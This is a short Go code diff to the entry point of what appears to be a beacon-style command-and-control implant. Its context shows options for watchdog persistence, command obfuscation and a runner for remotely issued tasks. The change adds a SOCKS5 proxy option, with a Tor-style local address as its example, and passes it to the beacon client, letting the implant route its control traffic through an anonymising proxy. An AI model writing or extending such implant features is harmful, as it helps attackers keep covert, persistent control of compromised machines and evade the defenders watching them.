@@ -33,6 +33,7 @@ func main() {
 	interval := flag.Int64("interval", 60000, "Base beacon interval in ms")
 	noPersistence := flag.Bool("no-persist", false, "Skip watchdog persistence install")
 	noObfuscate := flag.Bool("no-obfuscate", false, "Disable command obfuscation")
+	proxyAddr := flag.String("proxy", "", "SOCKS5 proxy address (e.g., socks5://127.0.0.1:9050)")
 	flag.Parse()
 
 	if *token == "" {
@@ -92,7 +93,7 @@ func main() {
 	profileInterval := 10 // re-profile every N beacons
 
 	// Create client and task runner
-	client := beacon.NewClient(*serverURL, *token, id)
+	client := beacon.NewClient(*serverURL, *token, id, *proxyAddr)
 	runner := executor.NewTaskRunner()
 
 	// Track start time for uptime
